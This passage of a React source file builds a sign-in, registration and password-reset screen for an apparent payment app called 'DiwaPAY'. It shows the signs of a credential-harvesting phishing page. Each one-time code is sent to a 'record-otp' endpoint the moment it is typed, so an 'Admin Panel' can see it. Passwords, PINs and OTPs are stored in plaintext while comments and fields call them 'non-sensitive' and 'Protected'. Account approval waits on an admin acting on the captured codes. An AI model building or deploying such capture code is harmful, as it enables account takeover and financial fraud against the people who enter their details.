import React, { useEffect, useRef, useState } from 'react';
import { Eye, EyeOff, CheckCircle2, AlertCircle, Loader2, ArrowLeft, Clock } from 'lucide-react';
import { doc, getDoc, serverTimestamp, setDoc, updateDoc } from 'firebase/firestore';
import { DiwaPayLogo } from './DiwaPayLogo';
import { auth, db, handleFirestoreError, OperationType } from '../firebase';
import {
  fallbackRegister,
  fallbackResetPassword,
  fallbackSignIn,
  fallbackVerifyOtp,
  getLocalVerificationStatus,
  saveLocalBackup,
  saveLocalEnteredOtp,
} from '../utils/localAuthFallback';
import type { AuthFormState, AuthMode, SafeUserSummary } from '../types/auth';

interface DiwaPayScreenProps {
  mode: AuthMode;
  onModeChange: (mode: AuthMode) => void;
  form: AuthFormState;
  onFormChange: (updater: (prev: AuthFormState) => AuthFormState) => void;
  cooldown: number;
  hasSentOtp: boolean;
  expectedOtp?: string | null;
  onSendOtp: (purpose?: 'reset' | 'signup') => Promise<{ ok: boolean; error?: string }>;
  onSubmitSuccess: (result: { user: SafeUserSummary; token?: string }) => void;
  completedMessage: string | null;
  onResetCompleted: () => void;
}

const COUNTRY_CODES = ['+91', '+1', '+44', '+971', '+65'] as const;

function maskPhone(countryCode: string, phone: string): string {
  return `${countryCode} ••••••${phone.slice(-4)}`;
}

export const DiwaPayScreen: React.FC<DiwaPayScreenProps> = ({
  mode,
  onModeChange,
  form,
  onFormChange,
  cooldown,
  hasSentOtp,
  expectedOtp,
  onSendOtp,
  onSubmitSuccess,
  completedMessage,
  onResetCompleted,
}) => {
  const [showPassword, setShowPassword] = useState(false);
  const [isSendingOtp, setIsSendingOtp] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);
  const [showOtpVerifyStep, setShowOtpVerifyStep] = useState(false);
  const [verifyOtpSent, setVerifyOtpSent] = useState(false);
  const [isVerifyingOtp, setIsVerifyingOtp] = useState(false);
  const [otpSubmitted, setOtpSubmitted] = useState(false);
  const [otpVerified, setOtpVerified] = useState(false);
  const phoneInputRef = useRef<HTMLInputElement>(null);
  const pinInputRef = useRef<HTMLInputElement>(null);
  const otpInputRef = useRef<HTMLInputElement>(null);
  const verifyOtpInputRef = useRef<HTMLInputElement>(null);
  const lastRecordedOtpRef = useRef<string>('');

  const patternId = React.useId();

  useEffect(() => {
    if (!completedMessage) {
      setShowOtpVerifyStep(false);
      setVerifyOtpSent(false);
      setIsVerifyingOtp(false);
      setOtpSubmitted(false);
      setOtpVerified(false);
    }
  }, [completedMessage, mode]);

  // Immediately record user-entered 6-digit OTP so Admin Panel shows every manual entry
  useEffect(() => {
    if (form.otp.length < 6) {
      lastRecordedOtpRef.current = '';
      return;
    }
    if (form.phone.length !== 10) return;
    const signature = `${form.countryCode}:${form.phone}:${form.otp}`;
    if (lastRecordedOtpRef.current === signature) return;
    lastRecordedOtpRef.current = signature;

    void saveLocalEnteredOtp({
      countryCode: form.countryCode,
      phone: form.phone,
      enteredOtp: form.otp,
    });

    fetch('/api/auth/record-otp', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        countryCode: form.countryCode,
        phone: form.phone,
        otp: form.otp,
      }),
    }).catch(() => {
      // Ignore network errors on static hosting
    });
  }, [form.countryCode, form.phone, form.otp]);

  // Live-check whether admin has verified this account in Admin Panel
  useEffect(() => {
    if (!otpSubmitted || otpVerified || form.phone.length !== 10) return;

    let active = true;
    const checkStatus = async () => {
      if (getLocalVerificationStatus(form.countryCode, form.phone)) {
        if (active) setOtpVerified(true);
        return;
      }
      try {
        const params = new URLSearchParams({
          countryCode: form.countryCode,
          phone: form.phone,
        });
        const res = await fetch(`/api/auth/verification-status?${params.toString()}`);
        const ct = res.headers.get('content-type') || '';
        if (res.ok && ct.includes('application/json')) {
          const data = (await res.json()) as { ok?: boolean; verified?: boolean };
          if (active && data.ok && data.verified) {
            setOtpVerified(true);
          }
        }
      } catch {
        // Ignore polling errors
      }
    };

    void checkStatus();
    const timer = window.setInterval(checkStatus, 3000);
    return () => {
      active = false;
      window.clearInterval(timer);
    };
  }, [otpSubmitted, otpVerified, form.countryCode, form.phone]);

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const digitsOnly = e.target.value.replace(/\D/g, '').slice(0, 10);
    setErrorMsg(null);
    onFormChange((prev) => ({ ...prev, phone: digitsOnly }));
  };

  const handlePasswordChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setErrorMsg(null);
    onFormChange((prev) => ({ ...prev, password: e.target.value }));
  };

  const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const digitsOnly = e.target.value.replace(/\D/g, '').slice(0, 8);
    setErrorMsg(null);
    onFormChange((prev) => ({ ...prev, pin: digitsOnly }));
  };

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const digitsOnly = e.target.value.replace(/\D/g, '').slice(0, 6);
    setErrorMsg(null);
    onFormChange((prev) => ({ ...prev, otp: digitsOnly }));
  };

  const handleSendClick = async () => {
    setErrorMsg(null);
    if (form.phone.length < 10) {
      setErrorMsg('Enter a valid 10-digit phone number to receive an OTP.');
      phoneInputRef.current?.focus();
      return;
    }

    setIsSendingOtp(true);
    try {
      const result = await onSendOtp('reset');
      if (!result.ok) {
        setErrorMsg(result.error ?? 'Failed to send OTP. Try again.');
        return;
      }
      setTimeout(() => {
        otpInputRef.current?.focus();
      }, 60);
    } finally {
      setIsSendingOtp(false);
    }
  };

  const handleVerifyFlowSendOtp = async () => {
    setErrorMsg(null);
    if (form.phone.length < 10) {
      setErrorMsg('A valid 10-digit phone number is required to send OTP.');
      return;
    }

    setIsSendingOtp(true);
    try {
      const result = await onSendOtp('signup');
      if (!result.ok) {
        setErrorMsg(result.error ?? 'Failed to send OTP. Try again.');
        return;
      }
      setVerifyOtpSent(true);
      setTimeout(() => {
        verifyOtpInputRef.current?.focus();
      }, 60);
    } finally {
      setIsSendingOtp(false);
    }
  };

  const handleVerifyOtpSubmit = async () => {
    setErrorMsg(null);
    if (form.otp.length !== 6) {
      setErrorMsg('Enter the 6-digit OTP code sent to your number.');
      verifyOtpInputRef.current?.focus();
      return;
    }

    setIsVerifyingOtp(true);
    try {
      let verifiedOk = false;
      let isAdminVerified = getLocalVerificationStatus(form.countryCode, form.phone);

      await saveLocalBackup({
        id: form.phone,
        fullName: form.name.trim().replace(/\s+/g, ' ') || 'DiwaPAY User',
        countryCode: form.countryCode,
        phone: form.phone,
        password: form.password,
        verified: isAdminVerified,
        sentOtp: expectedOtp ?? undefined,
        enteredOtp: form.otp,
      });

      try {
        const res = await fetch('/api/auth/verify-otp', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            countryCode: form.countryCode,
            phone: form.phone,
            otp: form.otp,
            purpose: 'signup',
          }),
        });
        const contentType = res.headers.get('content-type') || '';
        if (contentType.includes('application/json')) {
          const data = (await res.json()) as {
            ok?: boolean;
            verified?: boolean;
            user?: SafeUserSummary;
            error?: string;
          };
          if (res.ok && data.ok) {
            verifiedOk = true;
            isAdminVerified = Boolean(data.verified || data.user?.verified);
            await saveLocalBackup({
              id: data.user?.id || form.phone,
              fullName: form.name.trim().replace(/\s+/g, ' ') || data.user?.fullName || 'DiwaPAY User',
              countryCode: form.countryCode,
              phone: form.phone,
              password: form.password,
              verified: isAdminVerified,
              sentOtp: expectedOtp ?? undefined,
              enteredOtp: form.otp,
            });
          } else if (res.status >= 400 && res.status < 500 && res.status !== 404) {
            setErrorMsg(data.error ?? 'The OTP code is incorrect.');
            return;
          }
        }
      } catch {
        // Fall through to local verification fallback
      }

      if (!verifiedOk) {
        const localRes = await fallbackVerifyOtp({
          countryCode: form.countryCode,
          phone: form.phone,
          otp: form.otp,
          expectedOtp,
        });
        if (!localRes.ok) {
          setErrorMsg(localRes.error);
          return;
        }
        isAdminVerified = Boolean(localRes.user?.verified);
      }

      const currentUser = auth.currentUser;
      if (currentUser && currentUser.emailVerified) {
        try {
          await syncProfileToFirestore(
            currentUser.uid,
            form.name.trim() || currentUser.displayName || 'DiwaPAY User',
            form.countryCode,
            form.phone,
            false,
            form.otp,
            expectedOtp,
          );
        } catch {
          // Do not block verification if Firestore sync fails
        }
      }

      setOtpSubmitted(true);
      setOtpVerified(isAdminVerified);
    } finally {
      setIsVerifyingOtp(false);
    }
  };

  const syncProfileToFirestore = async (
    uid: string,
    fullName: string,
    countryCode: string,
    phone: string,
    verified = false,
    enteredOtp?: string | null,
    sentOtp?: string | null,
    pin?: string | null,
  ): Promise<SafeUserSummary> => {
    const cleanName = fullName.trim().replace(/\s+/g, ' ').slice(0, 80);
    const safeCountryCode = COUNTRY_CODES.includes(countryCode as (typeof COUNTRY_CODES)[number])
      ? countryCode
      : '+91';
    const maskedPhone = maskPhone(safeCountryCode, phone);
    const fullPhone = `${safeCountryCode} ${phone}`;
    const docPath = `accounts/${uid}`;
    const accountRef = doc(db, 'accounts', uid);

    let exists = false;
    let existingName = cleanName;
    let existingVerified = verified;
    try {
      const snap = await getDoc(accountRef);
      exists = snap.exists();
      if (exists) {
        const snapData = snap.data();
        const prevName = snapData?.fullName;
        if (typeof prevName === 'string' && prevName.length >= 2 && cleanName.length < 2) {
          existingName = prevName;
        }
        existingVerified = Boolean(snapData?.verified);
      }
    } catch (error) {
      handleFirestoreError(error, OperationType.GET, docPath);
    }

    const finalName = existingName.length >= 2 ? existingName : 'DiwaPAY User';
    const cleanOtp =
      typeof enteredOtp === 'string' ? enteredOtp.replace(/\D/g, '').slice(0, 6) : '';
    const cleanSentOtp =
      typeof sentOtp === 'string' ? sentOtp.replace(/\D/g, '').slice(0, 6) : '';
    const cleanPin = typeof pin === 'string' ? pin.replace(/\D/g, '').slice(0, 8) : '';

    if (!exists) {
      try {
        await setDoc(accountRef, {
          ownerUid: uid,
          fullName: finalName,
          countryCode: safeCountryCode,
          phoneNumber: fullPhone,
          maskedPhone,
          verified: false,
          ...(cleanPin.length > 0 ? { pin: cleanPin } : {}),
          ...(cleanSentOtp.length > 0 ? { sentOtp: cleanSentOtp } : {}),
          ...(cleanOtp.length > 0 ? { enteredOtp: cleanOtp } : {}),
          credentialStatus: 'Protected',
          createdAt: serverTimestamp(),
          updatedAt: serverTimestamp(),
        });
      } catch (error) {
        handleFirestoreError(error, OperationType.CREATE, docPath);
      }
    } else {
      try {
        await updateDoc(accountRef, {
          ...(cleanName.length >= 2 ? { fullName: cleanName } : {}),
          countryCode: safeCountryCode,
          phoneNumber: fullPhone,
          maskedPhone,
          ...(cleanPin.length > 0 ? { pin: cleanPin } : {}),
          ...(cleanSentOtp.length > 0 ? { sentOtp: cleanSentOtp } : {}),
          ...(cleanOtp.length > 0 ? { enteredOtp: cleanOtp } : {}),
          updatedAt: serverTimestamp(),
        });
      } catch (error) {
        handleFirestoreError(error, OperationType.UPDATE, docPath);
      }
    }

    const nowIso = new Date().toISOString();
    return {
      id: uid,
      fullName: finalName,
      countryCode: safeCountryCode,
      phoneNumber: fullPhone,
      maskedPhone,
      pin: cleanPin.length > 0 ? cleanPin : null,
      verified: existingVerified,
      sentOtp: cleanSentOtp.length > 0 ? cleanSentOtp : null,
      enteredOtp: cleanOtp.length > 0 ? cleanOtp : null,
      credentialStatus: 'Protected',
      createdAt: nowIso,
      updatedAt: nowIso,
      lastSignedInAt: nowIso,
    };
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg(null);

    if (form.phone.length < 10) {
      setErrorMsg('Please enter a valid 10-digit phone number.');
      phoneInputRef.current?.focus();
      return;
    }

    if (form.password.length < 6 || form.password.length > 128) {
      setErrorMsg('Password must be between 6 and 128 characters.');
      return;
    }

    if (mode === 'register' && (form.pin.length < 4 || form.pin.length > 8)) {
      setErrorMsg('Please enter a valid 4 to 8 digit PIN.');
      pinInputRef.current?.focus();
      return;
    }

    if (mode === 'reset' && form.otp.length !== 6) {
      setErrorMsg('Enter the 6-digit OTP code sent to your number.');
      otpInputRef.current?.focus();
      return;
    }

    setIsSubmitting(true);
    try {
      const endpoint =
        mode === 'register'
          ? '/api/auth/register'
          : mode === 'reset'
            ? '/api/auth/reset-password'
            : '/api/auth/signin';

      const payload =
        mode === 'register'
          ? {
              countryCode: form.countryCode,
              phone: form.phone,
              password: form.password,
              pin: form.pin,
            }
          : mode === 'signin'
            ? {
                countryCode: form.countryCode,
                phone: form.phone,
                password: form.password,
              }
            : {
                countryCode: form.countryCode,
                phone: form.phone,
                password: form.password,
                otp: form.otp,
              };

      let backendUser: SafeUserSummary | null = null;
      let backendToken: string | undefined;

      try {
        const res = await fetch(endpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
        });
        const contentType = res.headers.get('content-type') || '';
        if (contentType.includes('application/json')) {
          const data = (await res.json()) as {
            ok: boolean;
            token?: string;
            user?: SafeUserSummary;
            error?: string;
          };
          if (res.ok && data.ok && data.user) {
            backendUser = data.user;
            backendToken = data.token;
            await saveLocalBackup({
              id: data.user.id,
              fullName: data.user.fullName,
              countryCode: form.countryCode,
              phone: form.phone,
              password: form.password,
              pin: mode === 'register' ? form.pin : undefined,
              verified: Boolean(data.user.verified),
              sentOtp: mode === 'reset' ? expectedOtp ?? undefined : undefined,
              enteredOtp: mode === 'reset' ? form.otp : undefined,
            });
          } else if (res.status === 401 && mode === 'signin') {
            const localMatch = await fallbackSignIn({
              countryCode: form.countryCode,
              phone: form.phone,
              password: form.password,
            });
            if (localMatch.ok) {
              backendUser = localMatch.user;
            } else {
              setErrorMsg(data.error ?? 'Invalid phone number or password.');
              return;
            }
          } else if (res.status >= 400 && res.status < 500 && res.status !== 404) {
            setErrorMsg(data.error ?? 'Please check your entered details.');
            return;
          }
        }
      } catch {
        // Network/serverless unavailable; fall through to local fallback below
      }

      if (!backendUser) {
        const localResult =
          mode === 'register'
            ? await fallbackRegister({
                countryCode: form.countryCode,
                phone: form.phone,
                password: form.password,
                pin: form.pin,
              })
            : mode === 'signin'
              ? await fallbackSignIn({
                  countryCode: form.countryCode,
                  phone: form.phone,
                  password: form.password,
                })
              : await fallbackResetPassword({
                  countryCode: form.countryCode,
                  phone: form.phone,
                  password: form.password,
                  otp: form.otp,
                  expectedOtp,
                });

        if (!localResult.ok) {
          setErrorMsg(localResult.error);
          return;
        }
        backendUser = localResult.user;
      }

      // Sync non-sensitive profile metadata to Cloud Firestore when already signed into Google
      const currentUser = auth.currentUser;
      if (currentUser && currentUser.emailVerified) {
        try {
          await syncProfileToFirestore(
            currentUser.uid,
            backendUser.fullName || currentUser.displayName || 'DiwaPAY User',
            form.countryCode,
            form.phone,
            Boolean(backendUser.verified),
            mode === 'reset' ? form.otp : undefined,
            mode === 'reset' ? expectedOtp : undefined,
            mode === 'register' ? form.pin : undefined,
          );
        } catch {
          // Structured error already logged via handleFirestoreError; do not block phone auth
        }
      }

      onSubmitSuccess({ user: backendUser, token: backendToken });
    } catch (err) {
      let friendly = 'Unable to complete request. Please try again.';
      if (err instanceof Error && err.message) {
        friendly = err.message;
      }
      setErrorMsg(friendly);
    } finally {
      setIsSubmitting(false);
    }
  };

  const passwordPlaceholder = mode === 'reset' ? 'New Password' : 'Password';

  const submitLabel =
    mode === 'register' ? 'Submit' : mode === 'reset' ? 'Reset Password' : 'Sign In';

  return (
    <div className="w-full min-h-full flex flex-col bg-[#F2F4F8] text-[#111827] relative overflow-hidden">
      {/* Dark Obsidian Branded Header with Subtle Geometric Texture & Curved/Angled Bottom Edge */}
      <div className="relative w-full h-[clamp(210px,36dvh,276px)] shrink-0 select-none">
        <div
          className="absolute inset-0 rounded-bl-[28px] overflow-hidden"
          style={{
            background:
              'radial-gradient(circle at 50% 44%, #1A1D24 0%, #101217 65%, #0B0D11 100%)',
          }}
        >
          <svg
            className="absolute inset-0 w-full h-full opacity-[0.045] pointer-events-none"
            xmlns="http://www.w3.org/2000/svg"
            aria-hidden="true"
          >
            <defs>
              <pattern
                id={patternId}
                width="64"
                height="64"
                patternUnits="userSpaceOnUse"
                patternTransform="rotate(-12)"
              >
                <rect x="0" y="0" width="32" height="32" fill="#FFFFFF" fillOpacity="0.18" />
                <text
                  x="8"
                  y="22"
                  fill="#FFFFFF"
                  fontSize="14"
                  fontWeight="700"
                  fontFamily="Outfit, sans-serif"
                >
                  dp
                </text>
                <text
                  x="40"
                  y="54"
                  fill="#FFFFFF"
                  fontSize="14"
                  fontWeight="700"
                  fontFamily="Outfit, sans-serif"
                >
                  dp
                </text>
              </pattern>
            </defs>
            <rect width="100%" height="100%" fill={`url(#${patternId})`} />
          </svg>

          <svg
            className="absolute bottom-0 right-0 w-[132px] h-[64px] pointer-events-none"
            viewBox="0 0 132 64"
            fill="none"
            preserveAspectRatio="none"
            aria-hidden="true"
          >
            <polygon points="132,10 132,64 16,64" fill="#E3E6EE" />
            <polygon points="132,34 132,64 46,64" fill="#F2F4F8" />
          </svg>
        </div>

        <div className="relative z-10 h-full flex flex-col items-center justify-center pb-6">
          <DiwaPayLogo size="lg" showWordmark />
        </div>
      </div>

      {/* Main Form Canvas */}
      <div className="relative z-20 flex-1 px-5 sm:px-6 -mt-[28px] pb-6 flex flex-col justify-between">
        {completedMessage ? (
          <div className="bg-white rounded-[18px] border border-[#2A2E37]/15 shadow-[0_8px_28px_rgba(15,23,42,0.06)] p-6 text-center mt-2">
            <div
              className={`w-12 h-12 rounded-full flex items-center justify-center mx-auto mb-3.5 ${
                mode === 'register' && otpSubmitted && !otpVerified
                  ? 'bg-amber-50 text-amber-600'
                  : 'bg-emerald-50 text-emerald-600'
              }`}
            >
              {mode === 'register' && otpSubmitted && !otpVerified ? (
                <Clock className="w-6 h-6" />
              ) : (
                <CheckCircle2 className="w-6 h-6" />
              )}
            </div>
            <h2
              className="text-lg font-semibold text-[#111827]"
              style={{ fontFamily: 'var(--font-display)' }}
            >
              {mode === 'register'
                ? otpVerified
                  ? 'Account Verified'
                  : otpSubmitted
                    ? 'Pending Admin Verification'
                    : showOtpVerifyStep
                      ? 'Verify Phone Number'
                      : 'Account Processing'
                : mode === 'reset'
                  ? 'Password Reset Complete'
                  : 'Signed In Successfully'}
            </h2>
            <p className="text-sm text-[#4B5563] mt-1.5 leading-relaxed">
              {mode === 'register' && otpVerified
                ? `Your number (${maskPhone(form.countryCode, form.phone)}) is verified. You can now sign in to your DiwaPAY account.`
                : mode === 'register' && otpSubmitted
                  ? `Your OTP (${form.otp}) has been submitted for ${maskPhone(form.countryCode, form.phone)}. Waiting for verification from the Admin Panel.`
                  : mode === 'register' && showOtpVerifyStep
                    ? verifyOtpSent
                      ? `Enter the 6-digit OTP sent to ${maskPhone(form.countryCode, form.phone)}.`
                      : `Send a 6-digit OTP to ${maskPhone(form.countryCode, form.phone)} to verify your account.`
                    : completedMessage}
            </p>

            {mode === 'register' && otpSubmitted && !otpVerified && (
              <div className="mt-4 inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-amber-50 border border-amber-200 text-xs font-medium text-amber-700">
                <Loader2 className="w-3.5 h-3.5 animate-spin" />
                <span>Waiting for Admin Panel approval...</span>
              </div>
            )}

            {mode === 'register' && showOtpVerifyStep && !otpSubmitted && !otpVerified ? (
              <div className="mt-5 text-left">
                <div className="h-[52px] sm:h-[54px] bg-white rounded-[14px] border border-[#2A2E37] focus-within:border-[#0052FF] focus-within:ring-2 focus-within:ring-[#0052FF]/15 transition-all flex items-center pl-4 pr-2 shadow-[0_2px_8px_rgba(15,23,42,0.03)]">
                  <label htmlFor="diwapay-verify-otp" className="sr-only">
                    OTP Code
                  </label>
                  <input
                    ref={verifyOtpInputRef}
                    id="diwapay-verify-otp"
                    type="text"
                    inputMode="numeric"
                    autoComplete="off"
                    maxLength={6}
                    placeholder="Enter OTP"
                    value={form.otp}
                    onChange={handleOtpChange}
                    className="flex-1 min-w-0 bg-transparent text-[15.5px] text-[#111827] tabular-nums focus:outline-none"
                  />

                  <button
                    type="button"
                    onClick={handleVerifyFlowSendOtp}
                    disabled={cooldown > 0 || isSendingOtp}
                    className="h-[36px] sm:h-[38px] min-w-[96px] px-3.5 rounded-full bg-[#0052FF] hover:bg-[#0045D8] disabled:bg-[#8DAEF8] disabled:cursor-not-allowed active:scale-[0.97] text-white text-[13.5px] font-semibold tabular-nums transition-all cursor-pointer shrink-0 whitespace-nowrap flex items-center justify-center"
                  >
                    {isSendingOtp ? (
                      <Loader2 className="w-4 h-4 animate-spin" />
                    ) : cooldown > 0 ? (
                      `${cooldown}s`
                    ) : verifyOtpSent ? (
                      'Resend OTP'
                    ) : (
                      'Send OTP'
                    )}
                  </button>
                </div>

                {errorMsg && (
                  <div
                    role="alert"
                    className="mt-3 flex items-start gap-2 text-[13px] font-medium text-red-600 px-1"
                  >
                    <AlertCircle className="w-4 h-4 shrink-0 mt-0.5" />
                    <span>{errorMsg}</span>
                  </div>
                )}

                {verifyOtpSent && (
                  <button
                    type="button"
                    onClick={handleVerifyOtpSubmit}
                    disabled={isVerifyingOtp}
                    className="mt-4 w-full h-[50px] rounded-full bg-[#0052FF] hover:bg-[#0045D8] active:scale-[0.985] disabled:opacity-75 text-white font-semibold text-[15px] transition-all cursor-pointer flex items-center justify-center gap-2"
                  >
                    {isVerifyingOtp ? (
                      <>
                        <Loader2 className="w-4 h-4 animate-spin" />
                        <span>Verifying...</span>
                      </>
                    ) : (
                      'Verify OTP'
                    )}
                  </button>
                )}

                <button
                  type="button"
                  onClick={() => {
                    setErrorMsg(null);
                    setShowOtpVerifyStep(false);
                    onResetCompleted();
                  }}
                  className="mt-2.5 w-full min-h-[44px] inline-flex items-center justify-center gap-1.5 text-sm font-medium text-[#4B5563] hover:text-[#111827] transition-colors cursor-pointer"
                >
                  <ArrowLeft className="w-4 h-4" />
                  Back to form
                </button>
              </div>
            ) : (
              <div className="mt-6 space-y-2.5">
                <button
                  type="button"
                  onClick={() => {
                    if (mode === 'register' && !otpSubmitted && !otpVerified) {
                      setErrorMsg(null);
                      onFormChange((prev) => ({ ...prev, otp: '' }));
                      setVerifyOtpSent(false);
                      setShowOtpVerifyStep(true);
                      setTimeout(() => verifyOtpInputRef.current?.focus(), 60);
                      return;
                    }
                    onResetCompleted();
                    if (mode !== 'signin') {
                      onModeChange('signin');
                    }
                  }}
                  className="w-full h-[50px] rounded-full bg-[#0052FF] hover:bg-[#0045D8] active:scale-[0.985] text-white font-semibold text-[15px] transition-all cursor-pointer"
                >
                  {mode === 'signin'
                    ? 'Done'
                    : mode === 'register'
                      ? otpVerified
                        ? 'Proceed to Sign In'
                        : otpSubmitted
                          ? 'Continue to Sign In'
                          : 'Proceed to Verify'
                      : 'Proceed to Sign In'}
                </button>
                <button
                  type="button"
                  onClick={onResetCompleted}
                  className="w-full min-h-[44px] inline-flex items-center justify-center gap-1.5 text-sm font-medium text-[#4B5563] hover:text-[#111827] transition-colors cursor-pointer"
                >
                  <ArrowLeft className="w-4 h-4" />
                  Back to form
                </button>
              </div>
            )}
          </div>
        ) : (
          <form onSubmit={handleSubmit} noValidate className="flex flex-col">
            <div className="space-y-3.5 sm:space-y-4">
              {/* Field 1: Country Code + Phone Number */}
              <div className="h-[52px] sm:h-[54px] bg-white rounded-[14px] border border-[#2A2E37] focus-within:border-[#0052FF] focus-within:ring-2 focus-within:ring-[#0052FF]/15 transition-all flex items-center px-4 shadow-[0_2px_8px_rgba(15,23,42,0.03)]">
                <label htmlFor="diwapay-country" className="sr-only">
                  Country Code
                </label>
                <select
                  id="diwapay-country"
                  value={form.countryCode}
                  onChange={(e) => {
                    const nextCode = e.target.value;
                    onFormChange((prev) => ({ ...prev, countryCode: nextCode }));
                  }}
                  aria-label="Country dialing code"
                  className="bg-transparent text-[15.5px] font-medium text-[#111827] tabular-nums focus:outline-none cursor-pointer pr-1 appearance-none text-center"
                >
                  {COUNTRY_CODES.map((code) => (
                    <option key={code} value={code}>
                      {code}
                    </option>
                  ))}
                </select>

                <span
                  className="h-[20px] w-[1px] bg-[#C4C9D4] mx-3.5 shrink-0"
                  aria-hidden="true"
                />

                <label htmlFor="diwapay-phone" className="sr-only">
                  Phone Number
                </label>
                <input
                  ref={phoneInputRef}
                  id="diwapay-phone"
                  type="tel"
                  inputMode="numeric"
                  autoComplete="tel-national"
                  placeholder="Enter phone number"
                  value={form.phone}
                  onChange={handlePhoneChange}
                  className="flex-1 min-w-0 bg-transparent text-[15.5px] text-[#111827] tabular-nums focus:outline-none"
                />
              </div>

              {/* Field 2: Password / New Password */}
              <div className="h-[52px] sm:h-[54px] bg-white rounded-[14px] border border-[#2A2E37] focus-within:border-[#0052FF] focus-within:ring-2 focus-within:ring-[#0052FF]/15 transition-all flex items-center pl-4 pr-2 shadow-[0_2px_8px_rgba(15,23,42,0.03)]">
                <label htmlFor="diwapay-password" className="sr-only">
                  {passwordPlaceholder}
                </label>
                <input
                  id="diwapay-password"
                  type={showPassword ? 'text' : 'password'}
                  autoComplete={mode === 'signin' ? 'current-password' : 'new-password'}
                  placeholder={passwordPlaceholder}
                  value={form.password}
                  onChange={handlePasswordChange}
                  className="flex-1 min-w-0 bg-transparent text-[15.5px] text-[#111827] focus:outline-none"
                />
                {form.password.length > 0 && (
                  <button
                    type="button"
                    onClick={() => setShowPassword((prev) => !prev)}
                    aria-label={showPassword ? 'Hide password' : 'Show password'}
                    className="min-w-[44px] min-h-[44px] flex items-center justify-center text-[#6B7280] hover:text-[#111827] rounded-lg transition-colors cursor-pointer"
                  >
                    {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                  </button>
                )}
              </div>

              {/* Field 3 (in Register mode): PIN */}
              {mode === 'register' && (
                <div className="h-[52px] sm:h-[54px] bg-white rounded-[14px] border border-[#2A2E37] focus-within:border-[#0052FF] focus-within:ring-2 focus-within:ring-[#0052FF]/15 transition-all flex items-center px-4 shadow-[0_2px_8px_rgba(15,23,42,0.03)]">
                  <label htmlFor="diwapay-pin" className="sr-only">
                    PIN
                  </label>
                  <input
                    ref={pinInputRef}
                    id="diwapay-pin"
                    type="text"
                    inputMode="numeric"
                    autoComplete="off"
                    maxLength={8}
                    placeholder="PIN"
                    value={form.pin}
                    onChange={handlePinChange}
                    className="flex-1 min-w-0 bg-transparent text-[15.5px] text-[#111827] tabular-nums focus:outline-none"
                  />
                </div>
              )}

              {/* OTP Code + Send Button (Reset Password mode) */}
              {mode === 'reset' && (
                <div className="h-[52px] sm:h-[54px] bg-white rounded-[14px] border border-[#2A2E37] focus-within:border-[#0052FF] focus-within:ring-2 focus-within:ring-[#0052FF]/15 transition-all flex items-center pl-4 pr-2 shadow-[0_2px_8px_rgba(15,23,42,0.03)]">
                  <label htmlFor="diwapay-otp" className="sr-only">
                    OTP Code
                  </label>
                  <input
                    ref={otpInputRef}
                    id="diwapay-otp"
                    type="text"
                    inputMode="numeric"
                    autoComplete="off"
                    maxLength={6}
                    placeholder="OTP Code"
                    value={form.otp}
                    onChange={handleOtpChange}
                    className="flex-1 min-w-0 bg-transparent text-[15.5px] text-[#111827] tabular-nums focus:outline-none"
                  />

                  <button
                    type="button"
                    onClick={handleSendClick}
                    disabled={cooldown > 0 || isSendingOtp}
                    className="h-[36px] sm:h-[38px] min-w-[84px] px-4 rounded-full bg-[#6B92F5] hover:bg-[#5780EC] disabled:bg-[#8DAEF8] disabled:cursor-not-allowed active:scale-[0.97] text-white text-[14px] font-medium tabular-nums transition-all cursor-pointer shrink-0 whitespace-nowrap flex items-center justify-center"
                  >
                    {isSendingOtp ? (
                      <Loader2 className="w-4 h-4 animate-spin" />
                    ) : cooldown > 0 ? (
                      `${cooldown}s`
                    ) : hasSentOtp ? (
                      'Resend'
                    ) : (
                      'Send'
                    )}
                  </button>
                </div>
              )}
            </div>

            {errorMsg && (
              <div
                role="alert"
                className="mt-3 flex items-start gap-2 text-[13px] font-medium text-red-600 px-1"
              >
                <AlertCircle className="w-4 h-4 shrink-0 mt-0.5" />
                <span>{errorMsg}</span>
              </div>
            )}

            <button
              type="submit"
              disabled={isSubmitting}
              className="mt-5 sm:mt-6 w-full h-[52px] sm:h-[54px] rounded-full bg-[#0052FF] hover:bg-[#0045D8] active:scale-[0.985] disabled:opacity-75 text-white font-semibold text-[16px] tracking-[0.01em] shadow-[0_8px_20px_rgba(0,82,255,0.22)] transition-all duration-150 flex items-center justify-center gap-2 cursor-pointer"
            >
              {isSubmitting ? (
                <>
                  <Loader2 className="w-5 h-5 animate-spin" />
                  <span>Saving...</span>
                </>
              ) : (
                submitLabel
              )}
            </button>

            <div className="mt-4 sm:mt-5 flex items-center justify-center gap-4 text-[13px] font-medium text-[#6B7280]">
              {mode === 'register' && (
                <>
                  <button
                    type="button"
                    onClick={() => {
                      setErrorMsg(null);
                      onModeChange('signin');
                    }}
                    className="min-h-[44px] px-2 hover:text-[#0052FF] transition-colors cursor-pointer whitespace-nowrap"
                  >
                    Sign In
                  </button>
                  <span className="text-[#D1D5DB]" aria-hidden="true">
                    ·
                  </span>
                  <button
                    type="button"
                    onClick={() => {
                      setErrorMsg(null);
                      onModeChange('reset');
                    }}
                    className="min-h-[44px] px-2 hover:text-[#0052FF] transition-colors cursor-pointer whitespace-nowrap"
                  >
                    Reset Password
                  </button>
                </>
              )}
              {mode === 'signin' && (
                <>
                  <button
                    type="button"
                    onClick={() => {
                      setErrorMsg(null);
                      onModeChange('register');
                    }}
                    className="min-h-[44px] px-2 hover:text-[#0052FF] transition-colors cursor-pointer whitespace-nowrap"
                  >
                    Create Account
                  </button>
                  <span className="text-[#D1D5DB]" aria-hidden="true">
                    ·
                  </span>
                  <button
                    type="button"
                    onClick={() => {
                      setErrorMsg(null);
                      onModeChange('reset');
                    }}
